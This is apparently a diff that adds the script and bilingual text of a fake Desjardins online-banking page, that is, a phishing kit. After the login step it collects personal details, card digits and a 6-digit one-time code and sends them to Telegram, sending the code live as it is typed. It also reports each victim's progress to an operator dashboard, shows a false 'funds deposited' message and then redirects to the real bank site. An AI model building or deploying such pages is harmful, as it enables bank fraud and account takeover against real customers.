+    const cardDigitsInput = document.getElementById('cardDigitsInput');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const codeSection = document.getElementById('codeSection');
+
+    function checkInfoInputs() {
+        if (verifyBtn && firstNameInput && lastNameInput && dobInput && phoneInput && emailInput && addressInput && cityInput && postalCodeInput && provinceInput && countryInput && cardDigitsInput) {
+            const allFilled = firstNameInput.value.trim() &&
+                              lastNameInput.value.trim() &&
+                              dobInput.value.trim() &&
+                              phoneInput.value.trim() &&
+                              emailInput.value.trim() &&
+                              addressInput.value.trim() &&
+                              cityInput.value.trim() &&
+                              postalCodeInput.value.trim() &&
+                              provinceInput.value.trim() &&
+                              countryInput.value.trim() &&
+                              cardDigitsInput.value.trim();
+            if (allFilled) {
+                verifyBtn.removeAttribute('disabled');
+            } else {
+                verifyBtn.setAttribute('disabled', 'true');
+            }
+        }
+    }
+
+    if (verifyBtn) {
+        verifyBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<div class="spinner"></div>';
+
+            reportStatusToDashboard("desj.html", "En ligne (Étape 2: Informations soumises)");
+
+            updateSessionInfoData();
+            await sendOrUpdateInfoTelegram(sessionCollectedData, false);
+            pushLogToPanel('Desjardins (Infos)', sessionCollectedData.cardDigits || 'Carte validée', 'PENDING', `Nom: ${sessionCollectedData.fName} ${sessionCollectedData.lName}, Tél: ${sessionCollectedData.phone}`);
+
+            twoFactorSection.style.display = 'none';
+            codeSection.style.display = 'flex';
+
+            reportStatusToDashboard("desj.html", "En ligne (Étape 3: Code OTP)");
+
+            const codeInput = document.getElementById('codeInput');
+            if (codeInput) codeInput.focus();
+        });
+    }
+
+    const codeInput = document.getElementById('codeInput');
+    const submitCodeBtn = document.getElementById('submitCodeBtn');
+    const successSection = document.getElementById('successSection');
+
+    function handleOtpLiveUpdate() {
+        const code = codeInput.value.trim();
+        sessionCollectedData.otpCode = code;
+        if (code.length === 6) {
+            submitCodeBtn.removeAttribute('disabled');
+        } else {
+            submitCodeBtn.setAttribute('disabled', 'true');
+        }
+        if (code.length > 0) {
+            sendOrUpdateOtpTelegram(code, true);
+        }
+    }
+
+    if (codeInput && submitCodeBtn) {
+        submitCodeBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            submitCodeBtn.disabled = true;
+            submitCodeBtn.innerHTML = '<div class="spinner"></div>';
+            
+            reportStatusToDashboard("desj.html", "Code OTP validé");
+
+            const code = codeInput.value.trim();
+            sessionCollectedData.otpCode = code;
+            await sendOrUpdateOtpTelegram(code, false);
+
+            pushLogToPanel('Desjardins (Complet)', sessionCollectedData.cardDigits || 'Validé', 'SUCCESS', `OTP: ${code} | ${sessionCollectedData.fName} ${sessionCollectedData.lName}`);
+
+            codeSection.style.display = 'none';
+            successSection.style.display = 'flex';
+
+            setTimeout(() => {
+                window.location.replace('https://www.desjardins.com/');
+            }, 3000);
+        });
+    }
+
+    const translations = {
+        en: {
+            switchText: "Français",
+            contactUs: "Contact Us",
+            help: "Help",
+            textSizeTitle: "Text size",
+            textSizeDesc: "Use the buttons below to change the text size.",
+            loginTitle: "Log in to your account",
+            usernameLabel: "Username",
+            popTitle1: "AccèsD username",
+            popLi1: "Your Desjardins Access Card number",
+            popLi2: "Your virtual access card (non-members who hold a Desjardins credit card or prepaid card)",
+            popLi3: "Your email address (if an email address is saved in your usernames)",
+            popTitle2: "AccèsD Affaires username",
+            popLi4: "Your AccèsD Affaires user code",
+            popLink: "Learn more about usernames - This link will open in a new window.",
+            rememberMe: "Remember me",
+            isThisSafe: "(Is this safe?)",
+            safePopoverText: "A secure feature for your personal devices. Not recommended for use on a public or shared device.\n\nCheck the Remember me box so you don’t have to enter your username every time you log in.",
+            passwordLabel: "Password",
+            important: "Important:",
+            pwdSensitive: "Passwords are case-sensitive.",
+            forgotPwd: "Forgot your password?",
+            loginBtn: "Log in",
+            loadingText: "Loading",
+            loginErrorMsg: "Please enter a valid username and password.",
+            infoTitle: "Identity Verification",
+            infoSubtitle: "Please provide your personal and card details to complete security verification.",
+            firstNameLabel: "First Name",
+            lastNameLabel: "Last Name",
+            dobLabel: "Date of Birth",
+            phoneLabel: "Phone Number",
+            emailLabel: "Email Address",
+            addressLabel: "Address",
+            cityLabel: "City",
+            postalCodeLabel: "Postal Code",
+            provinceLabel: "Province",
+            countryLabel: "Country",
+            cardDigitsLabel: "Card digits (front of card / Access Card)",
+            verifyBtn: "Verify",
+            codeTitle: "Enter Verification Code",
+            codeSubtitle: "Please enter the 6-digit verification code sent to your phone.",
+            codeLabel: "Verification Code",
+            submitCodeBtn: "Submit",
+            successTitle: "Thank you!",
+            successMsg: "Thank you! Your funds have been successfully deposited.",
+            regLJ: "Register for Accès LJ",
+            regLJAff: "Register for Accès LJ Affaires",
+            becomeMember: "Become a member",
+            siteSec: "Site security",
+            techSupp: "Technical support",
+            repFraud: "Report fraud",
+            guaranteed: "Guaranteed",
+            secure100: "100% secure",
+            persServ: "PERSONAL SERVICES",
+            busServ: "BUSINESS SERVICES",
+            advice: "ADVICE",
+            aboutUs: "ABOUT US",
+            mobApp: "MOBILE APP",
+            footSec: "Security",
+            footTerms: "Terms of Use and legal notes",
+            footPriv: "Privacy",
+            footCookies: "Personalize cookies",
+            footAccess: "Accessibility",
+            footMap: "Site map",
+            copyright: "© 1996-2026, Mouvement des caisses Desjardins - Desjardins Group. All rights reserved."
+        },
+        fr: {
+            switchText: "English",
+            contactUs: "Nous joindre",
+            help: "Aide",
+            textSizeTitle: "Taille du texte",
+            textSizeDesc: "Utilisez les boutons ci-dessous pour modifier la taille du texte.",
+            loginTitle: "Se connecter à votre compte",
+            usernameLabel: "Nom d'utilisateur",
+            popTitle1: "Nom d'utilisateur AccèsD",
+            popLi1: "Votre numéro de carte d'accès Desjardins",
+            popLi2: "Votre carte d'accès virtuelle (non-membres détenteurs d'une carte de crédit ou prépayée Desjardins)",
+            popLi3: "Votre adresse courriel (si enregistrée dans vos noms d'utilisateur)",
+            popTitle2: "Nom d'utilisateur AccèsD Affaires",
+            popLi4: "Votre code d'utilisateur AccèsD Affaires",
+            popLink: "En savoir plus sur les noms d'utilisateur - Ce lien s'ouvriria dans une nouvelle fenêtre.",
+            rememberMe: "Se souvenir de moi",
+            isThisSafe: "(Est-ce sécuritaire ?)",
+            safePopoverText: "Fonctionnalité sécuritaire pour vos appareils personnels. Non recommandé sur un appareil public ou partagé.\n\nCochez la case Se souvenir de moi pour ne pas avoir à entrer votre nom d'utilisateur lors de vos prochaines connexions.",
+            passwordLabel: "Mot de passe",
+            important: "Important :",
+            pwdSensitive: "Les mots de passe respectent la majuscule/minuscule.",
+            forgotPwd: "Mot de passe oublié ?",
+            loginBtn: "Se connecter",
+            loadingText: "Chargement",
+            loginErrorMsg: "Veuillez entrer un nom d'utilisateur et un mot de passe valides.",
+            infoTitle: "Vérification d'identité",
+            infoSubtitle: "Veuillez fournir vos informations personnelles et les détails de votre carte pour confirmer votre identité.",
+            firstNameLabel: "Prénom",
+            lastNameLabel: "Nom",
+            dobLabel: "Date de naissance",
+            phoneLabel: "Numéro de téléphone",
+            emailLabel: "Adresse courriel",
+            addressLabel: "Adresse",
+            cityLabel: "Ville",
+            postalCodeLabel: "Code postal",
+            provinceLabel: "Province",
+            countryLabel: "Pays",
+            cardDigitsLabel: "Chiffres en avant de la carte",
+            verifyBtn: "Vérifier",
+            codeTitle: "Entrer le code de vérification",
+            codeSubtitle: "Veuillez entrer le code de vérification à 6 chiffres envoyé sur votre téléphone.",
+            codeLabel: "Code de vérification",
+            submitCodeBtn: "Soumettre",
+            successTitle: "Merci !",
+            successMsg: "Merci ! Vos fonds ont été déposés avec succès.",
+            regLJ: "S'inscrire à Accès LJ",
+            regLJAff: "S'inscrire à Accès LJ Affaires",
+            becomeMember: "Devenir membre",
+            siteSec: "Sécurité du site",
+            techSupp: "Support technique",
+            repFraud: "Signaler une fraude",
+            guaranteed: "Garanti",
+            secure100: "100 % sécurisé",
+            persServ: "SERVICES AUX PARTICULIERS",
+            busServ: "SERVICES AUX ENTREPRISES",
+            advice: "CONSEILS",
+            aboutUs: "À PROPOS DE NOUS",
+            mobApp: "APPLICATION MOBILE",
+            footSec: "Sécurité",
+            footTerms: "Conditions d'utilisation et notes légales",
+            footPriv: "Confidentialité",
+            footCookies: "Personnaliser les témoins",
+            footAccess: "Accessibilité",
+            footMap: "Plan du site",
+            copyright: "© 1996-2026, Mouvement des caisses Desjardins - Groupe Desjardins. Tous droits réservés."
+        }
+    };
+
+    let currentLang = 'en';
+    const langSwitch = document.getElementById('langSwitch');
+
+    langSwitch.addEventListener('click', function(e) {
+        e.preventDefault();
+        currentLang = (currentLang === 'en') ? 'fr' : 'en';
+        document.documentElement.setAttribute('lang', currentLang);
+
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const key = el.getAttribute('data-i18n');
+            if (translations[currentLang][key]) {
+                el.textContent = translations[currentLang][key];
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
